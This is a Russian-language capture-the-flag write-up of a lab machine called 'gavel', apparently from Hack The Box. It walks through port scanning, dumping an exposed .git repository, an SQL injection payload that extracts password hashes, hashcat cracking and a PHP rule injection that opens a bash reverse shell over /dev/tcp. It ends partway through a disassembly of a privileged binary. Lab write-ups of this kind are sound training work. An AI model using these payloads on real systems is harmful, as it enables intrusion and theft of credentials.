## Краткое описание

## Оглавление
[[#Разведка]]
[[#Анализ исходного кода]]
[[#SQL инъекция]]
[[#Взлом пароля админа]]
[[#Создание шела с помощью php]]
[[#Повышение до рута]]
[[#Перезапись php.ini]]
#### Разведка
начнем с nmap скана:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 10:06 GMT
Warning: 10.10.11.97 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.97
Host is up (0.10s latency).
Not shown: 65314 closed tcp ports (reset), 219 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: Host: gavel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 976.11 seconds
```
первый `feroxbuster` скан:
```
feroxbuster -u http://gavel.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,tar,conf,inc -t 200 -s 200,204,301,302,403


───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gavel.htb
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip, tar, conf, inc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter


---
200      GET       78l      213w     4281c http://gavel.htb/login.php
301      GET        9l       28w      309c http://gavel.htb/includes => http://gavel.htb/includes/
200      GET       84l      301w     4485c http://gavel.htb/register.php
200      GET      222l     1037w    13984c http://gavel.htb/index.php
301      GET        9l       28w      307c http://gavel.htb/assets => http://gavel.htb/assets/
302      GET        0l        0w        0c http://gavel.htb/admin.php => index.php
200      GET      102l      397w     3798c http://gavel.htb/assets/items.json
302      GET        0l        0w        0c http://gavel.htb/logout.php => index.php
200      GET     4422l    25758w  1976010c http://gavel.htb/assets/img/welcome.png
200      GET      222l     1035w    14008c http://gavel.htb/
302      GET        0l        0w        0c http://gavel.htb/inventory.php => index.php
301      GET        9l       28w      306c http://gavel.htb/rules => http://gavel.htb/rules/
200      GET        0l        0w        0c http://gavel.htb/includes/config.php
200      GET        0l        0w        0c http://gavel.htb/includes/auction.php
200      GET        0l        0w        0c http://gavel.htb/includes/session.php

[####################] - 5m    270000/270000  823/s   http://gavel.htb/includes/ 
[####################] - 5m    270000/270000  822/s   http://gavel.htb/assets/vendor/jquery/ 
[####################] - 7s    270000/270000  37948/s http://gavel.htb/assets/vendor/fontawesome-free/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s    270000/270000  1356784/s http://gavel.htb/assets/js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s    270000/270000  38012/s http://gavel.htb/assets/vendor/jquery-easing/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5m    270000/270000  871/s   http://gavel.htb/rules/
```
второй:
```
feroxbuster -u http://gavel.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt 
                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://gavel.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        8l       20w      136c http://gavel.htb/.git/config
200      GET       78l      213w     4281c http://gavel.htb/login.php
200      GET       84l      301w     4485c http://gavel.htb/register.php
200      GET        7l       33w     1265c http://gavel.htb/assets/js/sb-admin-2.min.js
200      GET       59l      254w     1656c http://gavel.htb/assets/vendor/jquery-easing/jquery.easing.compatibility.js
200      GET    11299l    22157w   212581c http://gavel.htb/assets/css/sb-admin-2.css
200      GET      166l      953w     4047c http://gavel.htb/assets/vendor/jquery-easing/jquery.easing.js
200      GET        1l       44w     2532c http://gavel.htb/assets/vendor/jquery-easing/jquery.easing.min.js
200      GET        3l       23w      187c http://gavel.htb/assets/vendor/fontawesome-free/attribution.js
301      GET        9l       28w      305c http://gavel.htb/.git => http://gavel.htb/.git/
200      GET        1l        2w       23c http://gavel.htb/.git/HEAD

```

мы знаем что открыто 2 порта 22 и 80 + есть веб приложение, со страницами login, register,  index, admin,  inventory, auction, .git, самое интересное для нас это гит потому что это незакрытый от чужих глаз репозиторий проекта, попробуем его выкачать с помощью `git-dumper`

#### Анализ исходного кода

```shell
python3 git_dumper.py http://gavel.htb/.git ~/Desktop/gavelHTB 
[-] Testing http://gavel.htb/.git/HEAD [200]
[-] Testing http://gavel.htb/.git/ [200]
...
```
получаем вот такое содержимое проекта: 
```shell
rwxrwxr-x  6 user user  4096 Dec 13 12:31 .
drwxr-xr-x 12 user user  4096 Dec 12 12:30 ..
-rwxrwxr-x  1 user user  8820 Dec 13 12:31 admin.php
drwxrwxr-x  6 user user  4096 Dec 13 12:31 assets
-rwxrwxr-x  1 user user  8441 Dec 13 12:31 bidding.php
drwxrwxr-x  7 user user  4096 Dec 13 12:31 .git
drwxrwxr-x  2 user user  4096 Dec 13 12:31 includes
-rwxrwxr-x  1 user user 14520 Dec 13 12:31 index.php
-rwxrwxr-x  1 user user  8384 Dec 13 12:31 inventory.php
-rwxrwxr-x  1 user user  6408 Dec 13 12:31 login.php
-rwxrwxr-x  1 user user   161 Dec 13 12:31 logout.php
-rwxrwxr-x  1 user user  7058 Dec 13 12:31 register.php
drwxrwxr-x  2 user user  4096 Dec 13 12:31 rules
```
перед анализом кода посмотрим с чем визуально мы имеем дело, по факту это это сайт аукцион где мы можем покупать товары, причем в одном из комментариев указано что кто то взломал его, ![[Pasted image 20251213193638.png]]
![[Pasted image 20251213193732.png]]
пробуем зарегистрироваться посмотрим что будет и к каким страницам мы имеем доступ
После регистрации мы имеем доступ к 3 страницам
`bidding.php`
![[Pasted image 20251213193855.png]]
`inventory.php` ![[Pasted image 20251213193917.png]]
к `admin.php` как и ожидалось доступа нет хотя это скорее всего админ панель то есть самое вкусное с нее и начнем
```php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';
require_once __DIR__ . '/includes/auction.php';

if (!isset($_SESSION['user']) || $_SESSION['user']['role'] !== 'auctioneer') {
    header('Location: index.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $auction_id = intval($_POST['auction_id'] ?? 0);
    $rule = trim($_POST['rule'] ?? '');
    $message = trim($_POST['message'] ?? '');

    if ($auction_id > 0 && (empty($rule) || empty($message))) {
        $stmt = $pdo->prepare("SELECT rule, message FROM auctions WHERE id = ?");
        $stmt->execute([$auction_id]);
        $row = $stmt->fetch(PDO::FETCH_ASSOC);
        if (!$row) {
            $_SESSION['success'] = 'Auction not found.';
            header('Location: admin.php');
            exit;
        }
        if (empty($rule))    $rule = $row['rule'];
        if (empty($message)) $message = $row['message'];
    }

    if ($auction_id > 0 && $rule && $message) {
        $stmt = $pdo->prepare("UPDATE auctions SET rule = ?, message = ? WHERE id = ?");
        $stmt->execute([$rule, $message, $auction_id]);
        $_SESSION['success'] = 'Rule and message updated successfully!';
        header('Location: admin.php');
        exit;
    }
}

$stmt = $pdo->query("SELECT * FROM auctions WHERE status = 'active' ORDER BY id");
$current_auction = $stmt->fetchAll(PDO::FETCH_ASSOC);
?>
```
Во первых пока не получим роль `auctioneer` доступ к админ панели нам не видать, во вторых из момента создания видим что `$rule` вставляется в запрос совсем без фильтрации может sql, почитаем еще файлы.
После долго анализа кода проекта при помощи ИИ и собственных сил мне удалось обнаружить куда уходит строчка rule которую мы можем задать от админа
```php
$rule = $auction['rule'];
$rule_message = $auction['message'];

$allowed = false;

try {
    if (function_exists('ruleCheck')) {
        runkit_function_remove('ruleCheck');
    }
    runkit_function_add('ruleCheck', '$current_bid, $previous_bid, $bidder', $rule);
    error_log("Rule: " . $rule);
    $allowed = ruleCheck($current_bid, $previous_bid, $bidder);
} catch (Throwable $e) {
    error_log("Rule error: " . $e->getMessage());
    $allowed = false;
}

if (!$allowed) {
    echo json_encode(['success' => false, 'message' => $rule_message]);
    exit;
}
```
тут наше старое правило которое было применено удаляется если существует и добавляется наше новое без проверки и по факту когда мы сделаем ставку, должна запуститься функция `rule` а это значит что мы сможем исполнить php код

#### SQL инъекция
Следующее что я нашел это код страницы inventory.php
```php
<?php
require_once __DIR__ . '/includes/config.php';
require_once __DIR__ . '/includes/db.php';
require_once __DIR__ . '/includes/session.php';

if (!isset($_SESSION['user'])) {
    header('Location: index.php');
    exit;
}

$sortItem = $_POST['sort'] ?? $_GET['sort'] ?? 'item_name';
$userId = $_POST['user_id'] ?? $_GET['user_id'] ?? $_SESSION['user']['id'];
$col = "`" . str_replace("`", "", $sortItem) . "`";
$itemMap = [];
$itemMeta = $pdo->prepare("SELECT name, description, image FROM items WHERE name = ?");
try {
    if ($sortItem === 'quantity') {
        $stmt = $pdo->prepare("SELECT item_name, item_image, item_description, quantity FROM inventory WHERE user_id = ? ORDER BY quantity DESC");
        $stmt->execute([$userId]);
    } else {
        $stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
    }
    $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (Exception $e) {
    $results = [];
}
foreach ($results as $row) {
    $firstKey = array_keys($row)[0];
    $name = $row['item_name'] ?? $row[$firstKey] ?? null;
    if (!$name) {
        continue;
    }
    $meta = [];
    try {
        $itemMeta->execute([$name]);
        $meta = $itemMeta->fetch(PDO::FETCH_ASSOC);
    } catch (Exception $e) {
        $meta = [];
    }
    $itemMap[$name] = [
        'name' => $name ?? "",
        'description' => $meta['description'] ?? "",
        'image' => $meta['image'] ?? "",
        'quantity' => $row['quantity'] ?? (is_numeric($row[$firstKey]) ? $row[$firstKey] : 1)
    ];
}
$stmt = $pdo->prepare("SELECT money FROM users WHERE id = ?");
$stmt->execute([$_SESSION['user']['id']]);
$money = $stmt->fetchColumn();
?>
```
параметр `$sortItem` вставляется напрямую в тело нашего запроса если это не `quantity`
и основная уязвимость тут
```php
$col = "`" . str_replace("`", "", $sortItem) . "`";
...
$stmt = $pdo->prepare("SELECT $col FROM inventory WHERE user_id = ? ORDER BY item_name ASC");
        $stmt->execute([$userId]);
```
по факту ин нашего параметра `$sortItem` мы получаем пусть параметр `x` тогда после первой строчки будет
```sql
$col = "`x`"
```
и ничего не удаляется кроме наклонных верхних кавычек а потом все оборачивается в них
а `$userId` вообще заходит без фильтрации, и вот на этом моменте я сдался и посмотрел в другой райтап потому что не смог придумать как это эксплуатировать
по факту у нас можно использовать `\?';-- -%00` комбинацию комментария и нулевого байта чтобы оборвать строку  и слеш вопрос нужен для того чтобы сломать детекцию параметров, потому что `PDO` смотрит места для вставки до формирования запроса и отправки его в MySQL и не распознает экранированный, а для второго параметра мы используем 
```
`+FROM+(SELECT+group_concat(username,0x3a,password)+AS+`'`+FROM+users)y;--+-
```
по факту передаем ничего и закрываем кавычку а дальше забираем содержимое таблицы `y` в которой содержатся `username:password` и в результате получим это: 
![[Pasted image 20251214194643.png]]
#### Взлом пароля админа
Пробуем просто перебрать с помощью `hachcat` и `rockyou`
```
hashcat -a 0 -m 3200 1.txt rockyou.txt 
...
hashcat -a 0 -m 3200 1.txt --show 
$2y$10$MNkDHV6g16FjW/lAQRpLiuQXN4MVkdMuILn0pLQlC2So9SgH5RTfS:midnight1
```
я пробовал подключится по ssh к машине но не сработало, единсвенный выход это идем на сайт и админ панель, потому что там есть уязвимость которую можно использовать![[Pasted image 20251214195524.png]]
#### Создание шела с помощью php
мы  вошли теперь у нас есть админская панель, как я писал выше, тут можно вставить `rule` и оно будет исполнятся для любого предмета, я просто прокину с помощью него шел до себя
используем код для php
```
exec("bash -c 'bash -i >& /dev/tcp/IP/port 0>&1'");
return true;
```
я немного ошибся в анализе кода, потому что нам надо провзаимодействовать с предметом на площадке чтобы правило отработало, просто ставим ставку, после чего получаем получаем наш шел, дальше стабилизируем
```
ssty raw -echo; fg

python3 -c 'import pty; pty.spawn("/bin/bash")'
```
поиск флага от юзера мне нечего не дал, но на самой машине есть пользователь с таким же именем как и админ на сайте, и пароль от него подходит, забираем наш user флаг из его директории
```
auctioneer@gavel:/home$ cd auctioneer/
auctioneer@gavel:~$ ls -la
total 12
drwxr-x--- 2 auctioneer auctioneer 4096 Dec 14 10:20 .
drwxr-xr-x 3 root       root       4096 Nov  5 12:46 ..
lrwxrwxrwx 1 root       root          9 Nov  5 12:20 .bash_history -> /dev/null
-rw-r----- 1 root       auctioneer   33 Dec 14 09:38 user.txt
auctioneer@gavel:~$ cat user.txt 
b7603869835b7df48ff20d507d68c763
```
#### Повышение до рута
команд для судо нет, я запускал linpeas но внятного тоже ничего не увидел, но меня привлекла функция 
```
drwxr-xr-x  2 root root          4096 Oct  3 19:35 .
drwxr-xr-x 10 root root          4096 Sep 11  2024 ..
-rwxr-xr-x  1 root gavel-seller 17688 Oct  3 19:35 gavel-util
```
которая принадлежит руту но мы можем ее запускать, я выкачал ее и дизасемблировал 
```asm

./gavel-util:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64
    1004:	48 83 ec 08          	sub    rsp,0x8
    1008:	48 8b 05 d9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 <__gmon_start__@Base>
    100f:	48 85 c0             	test   rax,rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   rax
    1016:	48 83 c4 08          	add    rsp,0x8
    101a:	c3                   	ret

Disassembly of section .plt:

0000000000001020 <.plt>:
    1020:	ff 35 aa 2e 00 00    	push   QWORD PTR [rip+0x2eaa]        # 3ed0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	f2 ff 25 ab 2e 00 00 	bnd jmp QWORD PTR [rip+0x2eab]        # 3ed8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102d:	0f 1f 00             	nop    DWORD PTR [rax]
    1030:	f3 0f 1e fa          	endbr64
    1034:	68 00 00 00 00       	push   0x0
    1039:	f2 e9 e1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    103f:	90                   	nop
    1040:	f3 0f 1e fa          	endbr64
    1044:	68 01 00 00 00       	push   0x1
    1049:	f2 e9 d1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    104f:	90                   	nop
    1050:	f3 0f 1e fa          	endbr64
    1054:	68 02 00 00 00       	push   0x2
    1059:	f2 e9 c1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    105f:	90                   	nop
    1060:	f3 0f 1e fa          	endbr64
    1064:	68 03 00 00 00       	push   0x3
    1069:	f2 e9 b1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    106f:	90                   	nop
    1070:	f3 0f 1e fa          	endbr64
    1074:	68 04 00 00 00       	push   0x4
    1079:	f2 e9 a1 ff ff ff    	bnd jmp 1020 <_init+0x20>
    107f:	90                   	nop
    1080:	f3 0f 1e fa          	endbr64
    1084:	68 05 00 00 00       	push   0x5
    1089:	f2 e9 91 ff ff ff    	bnd jmp 1020 <_init+0x20>
    108f:	90                   	nop
    1090:	f3 0f 1e fa          	endbr64
    1094:	68 06 00 00 00       	push   0x6
    1099:	f2 e9 81 ff ff ff    	bnd jmp 1020 <_init+0x20>
    109f:	90                   	nop
    10a0:	f3 0f 1e fa          	endbr64
    10a4:	68 07 00 00 00       	push   0x7
    10a9:	f2 e9 71 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10af:	90                   	nop
    10b0:	f3 0f 1e fa          	endbr64
    10b4:	68 08 00 00 00       	push   0x8
    10b9:	f2 e9 61 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10bf:	90                   	nop
    10c0:	f3 0f 1e fa          	endbr64
    10c4:	68 09 00 00 00       	push   0x9
    10c9:	f2 e9 51 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10cf:	90                   	nop
    10d0:	f3 0f 1e fa          	endbr64
    10d4:	68 0a 00 00 00       	push   0xa
    10d9:	f2 e9 41 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10df:	90                   	nop
    10e0:	f3 0f 1e fa          	endbr64
    10e4:	68 0b 00 00 00       	push   0xb
    10e9:	f2 e9 31 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10ef:	90                   	nop
    10f0:	f3 0f 1e fa          	endbr64
    10f4:	68 0c 00 00 00       	push   0xc
    10f9:	f2 e9 21 ff ff ff    	bnd jmp 1020 <_init+0x20>
    10ff:	90                   	nop
    1100:	f3 0f 1e fa          	endbr64
    1104:	68 0d 00 00 00       	push   0xd
    1109:	f2 e9 11 ff ff ff    	bnd jmp 1020 <_init+0x20>
    110f:	90                   	nop
    1110:	f3 0f 1e fa          	endbr64
    1114:	68 0e 00 00 00       	push   0xe
    1119:	f2 e9 01 ff ff ff    	bnd jmp 1020 <_init+0x20>
    111f:	90                   	nop
    1120:	f3 0f 1e fa          	endbr64
    1124:	68 0f 00 00 00       	push   0xf
    1129:	f2 e9 f1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    112f:	90                   	nop
    1130:	f3 0f 1e fa          	endbr64
    1134:	68 10 00 00 00       	push   0x10
    1139:	f2 e9 e1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    113f:	90                   	nop
    1140:	f3 0f 1e fa          	endbr64
    1144:	68 11 00 00 00       	push   0x11
    1149:	f2 e9 d1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    114f:	90                   	nop
    1150:	f3 0f 1e fa          	endbr64
    1154:	68 12 00 00 00       	push   0x12
    1159:	f2 e9 c1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    115f:	90                   	nop
    1160:	f3 0f 1e fa          	endbr64
    1164:	68 13 00 00 00       	push   0x13
    1169:	f2 e9 b1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    116f:	90                   	nop
    1170:	f3 0f 1e fa          	endbr64
    1174:	68 14 00 00 00       	push   0x14
    1179:	f2 e9 a1 fe ff ff    	bnd jmp 1020 <_init+0x20>
    117f:	90                   	nop
    1180:	f3 0f 1e fa          	endbr64
    1184:	68 15 00 00 00       	push   0x15
    1189:	f2 e9 91 fe ff ff    	bnd jmp 1020 <_init+0x20>
    118f:	90                   	nop
    1190:	f3 0f 1e fa          	endbr64
    1194:	68 16 00 00 00       	push   0x16
    1199:	f2 e9 81 fe ff ff    	bnd jmp 1020 <_init+0x20>
    119f:	90                   	nop
    11a0:	f3 0f 1e fa          	endbr64
    11a4:	68 17 00 00 00       	push   0x17
    11a9:	f2 e9 71 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11af:	90                   	nop
    11b0:	f3 0f 1e fa          	endbr64
    11b4:	68 18 00 00 00       	push   0x18
    11b9:	f2 e9 61 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11bf:	90                   	nop
    11c0:	f3 0f 1e fa          	endbr64
    11c4:	68 19 00 00 00       	push   0x19
    11c9:	f2 e9 51 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11cf:	90                   	nop
    11d0:	f3 0f 1e fa          	endbr64
    11d4:	68 1a 00 00 00       	push   0x1a
    11d9:	f2 e9 41 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11df:	90                   	nop
    11e0:	f3 0f 1e fa          	endbr64
    11e4:	68 1b 00 00 00       	push   0x1b
    11e9:	f2 e9 31 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11ef:	90                   	nop
    11f0:	f3 0f 1e fa          	endbr64
    11f4:	68 1c 00 00 00       	push   0x1c
    11f9:	f2 e9 21 fe ff ff    	bnd jmp 1020 <_init+0x20>
    11ff:	90                   	nop
    1200:	f3 0f 1e fa          	endbr64
    1204:	68 1d 00 00 00       	push   0x1d
    1209:	f2 e9 11 fe ff ff    	bnd jmp 1020 <_init+0x20>
    120f:	90                   	nop
    1210:	f3 0f 1e fa          	endbr64
    1214:	68 1e 00 00 00       	push   0x1e
    1219:	f2 e9 01 fe ff ff    	bnd jmp 1020 <_init+0x20>
    121f:	90                   	nop

Disassembly of section .plt.got:

0000000000001220 <__cxa_finalize@plt>:
    1220:	f3 0f 1e fa          	endbr64
    1224:	f2 ff 25 cd 2d 00 00 	bnd jmp QWORD PTR [rip+0x2dcd]        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    122b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

Disassembly of section .plt.sec:

0000000000001230 <json_object_new_string@plt>:
    1230:	f3 0f 1e fa          	endbr64
    1234:	f2 ff 25 a5 2c 00 00 	bnd jmp QWORD PTR [rip+0x2ca5]        # 3ee0 <json_object_new_string@JSONC_0.14>
    123b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001240 <free@plt>:
    1240:	f3 0f 1e fa          	endbr64
    1244:	f2 ff 25 9d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c9d]        # 3ee8 <free@GLIBC_2.2.5>
    124b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001250 <__vfprintf_chk@plt>:
    1250:	f3 0f 1e fa          	endbr64
    1254:	f2 ff 25 95 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c95]        # 3ef0 <__vfprintf_chk@GLIBC_2.3.4>
    125b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001260 <__errno_location@plt>:
    1260:	f3 0f 1e fa          	endbr64
    1264:	f2 ff 25 8d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c8d]        # 3ef8 <__errno_location@GLIBC_2.2.5>
    126b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001270 <puts@plt>:
    1270:	f3 0f 1e fa          	endbr64
    1274:	f2 ff 25 85 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c85]        # 3f00 <puts@GLIBC_2.2.5>
    127b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001280 <fread@plt>:
    1280:	f3 0f 1e fa          	endbr64
    1284:	f2 ff 25 7d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c7d]        # 3f08 <fread@GLIBC_2.2.5>
    128b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001290 <json_object_to_json_string_ext@plt>:
    1290:	f3 0f 1e fa          	endbr64
    1294:	f2 ff 25 75 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c75]        # 3f10 <json_object_to_json_string_ext@JSONC_0.14>
    129b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012a0 <write@plt>:
    12a0:	f3 0f 1e fa          	endbr64
    12a4:	f2 ff 25 6d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c6d]        # 3f18 <write@GLIBC_2.2.5>
    12ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012b0 <fclose@plt>:
    12b0:	f3 0f 1e fa          	endbr64
    12b4:	f2 ff 25 65 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c65]        # 3f20 <fclose@GLIBC_2.2.5>
    12bb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012c0 <strlen@plt>:
    12c0:	f3 0f 1e fa          	endbr64
    12c4:	f2 ff 25 5d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c5d]        # 3f28 <strlen@GLIBC_2.2.5>
    12cb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012d0 <__stack_chk_fail@plt>:
    12d0:	f3 0f 1e fa          	endbr64
    12d4:	f2 ff 25 55 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c55]        # 3f30 <__stack_chk_fail@GLIBC_2.4>
    12db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012e0 <strchr@plt>:
    12e0:	f3 0f 1e fa          	endbr64
    12e4:	f2 ff 25 4d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c4d]        # 3f38 <strchr@GLIBC_2.2.5>
    12eb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000012f0 <json_object_object_add@plt>:
    12f0:	f3 0f 1e fa          	endbr64
    12f4:	f2 ff 25 45 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c45]        # 3f40 <json_object_object_add@JSONC_0.14>
    12fb:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001300 <close@plt>:
    1300:	f3 0f 1e fa          	endbr64
    1304:	f2 ff 25 3d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c3d]        # 3f48 <close@GLIBC_2.2.5>
    130b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001310 <read@plt>:
    1310:	f3 0f 1e fa          	endbr64
    1314:	f2 ff 25 35 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c35]        # 3f50 <read@GLIBC_2.2.5>
    131b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001320 <calloc@plt>:
    1320:	f3 0f 1e fa          	endbr64
    1324:	f2 ff 25 2d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c2d]        # 3f58 <calloc@GLIBC_2.2.5>
    132b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001330 <strcmp@plt>:
    1330:	f3 0f 1e fa          	endbr64
    1334:	f2 ff 25 25 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c25]        # 3f60 <strcmp@GLIBC_2.2.5>
    133b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001340 <__memcpy_chk@plt>:
    1340:	f3 0f 1e fa          	endbr64
    1344:	f2 ff 25 1d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c1d]        # 3f68 <__memcpy_chk@GLIBC_2.3.4>
    134b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001350 <stat@plt>:
    1350:	f3 0f 1e fa          	endbr64
    1354:	f2 ff 25 15 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c15]        # 3f70 <stat@GLIBC_2.33>
    135b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001360 <malloc@plt>:
    1360:	f3 0f 1e fa          	endbr64
    1364:	f2 ff 25 0d 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c0d]        # 3f78 <malloc@GLIBC_2.2.5>
    136b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001370 <json_object_put@plt>:
    1370:	f3 0f 1e fa          	endbr64
    1374:	f2 ff 25 05 2c 00 00 	bnd jmp QWORD PTR [rip+0x2c05]        # 3f80 <json_object_put@JSONC_0.14>
    137b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001380 <__printf_chk@plt>:
    1380:	f3 0f 1e fa          	endbr64
    1384:	f2 ff 25 fd 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bfd]        # 3f88 <__printf_chk@GLIBC_2.3.4>
    138b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

0000000000001390 <fopen@plt>:
    1390:	f3 0f 1e fa          	endbr64
    1394:	f2 ff 25 f5 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bf5]        # 3f90 <fopen@GLIBC_2.2.5>
    139b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013a0 <perror@plt>:
    13a0:	f3 0f 1e fa          	endbr64
    13a4:	f2 ff 25 ed 2b 00 00 	bnd jmp QWORD PTR [rip+0x2bed]        # 3f98 <perror@GLIBC_2.2.5>
    13ab:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]

00000000000013b0 <exit@plt>:
    13b0:	f3 0f 1e fa          	endbr64
